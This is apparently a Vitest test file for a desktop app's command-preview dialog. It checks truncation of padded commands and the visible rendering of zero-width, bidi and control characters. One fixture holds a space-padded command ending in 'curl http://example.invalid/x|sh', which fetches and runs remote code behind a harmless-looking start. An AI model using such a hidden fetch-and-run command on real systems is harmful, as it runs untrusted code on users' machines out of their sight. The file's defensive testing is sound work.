import { describe, expect, it } from 'vitest';
import { PREVIEW_CHARS, commandMessage, commandView, visibleText } from '../../src/desktop/pcCommandView';

describe('the PC command preview', () => {
  it('a short command is shown whole, without a marker', () => {
    const m = commandMessage('Prod', 'the host wants to run this command on your PC', 'calc.exe');
    expect(m.text).toContain('calc.exe');
    expect(m.text).not.toContain('more characters');
    expect(m.detail).toBe('calc.exe');
  });

  it('a padded command shows its beginning and says how much is left out; the area holds all of it', () => {
    const evil = `echo hi${' '.repeat(2000)};curl http://example.invalid/x|sh`;
    const v = commandView(evil);
    expect(v.preview.startsWith('echo hi')).toBe(true);
    expect([...v.preview].length).toBeLessThanOrEqual(PREVIEW_CHARS);
    expect(v.more).toBe([...evil].length - PREVIEW_CHARS);
    expect(v.full.endsWith('|sh')).toBe(true);
    const m = commandMessage('Prod', 'the host wants to run this command on your PC', evil);
    expect(m.text).toContain(`(${v.more} more characters`);
    expect(m.text.length).toBeLessThan(400);
    expect(m.detail).toBe(evil);
  });

  it('writes out newlines, zero-width, bidi and other invisible characters', () => {
    expect(visibleText('a\nb')).toBe('a\\nb');
    expect(visibleText('a​b')).toBe('a\\u{200B}b');
    expect(visibleText('a‮b')).toBe('a\\u{202E}b');
    expect(visibleText('a\u0000b')).toBe('a\\u{0}b');
    expect(visibleText('plain text 1-2')).toBe('plain text 1-2');
  });
});
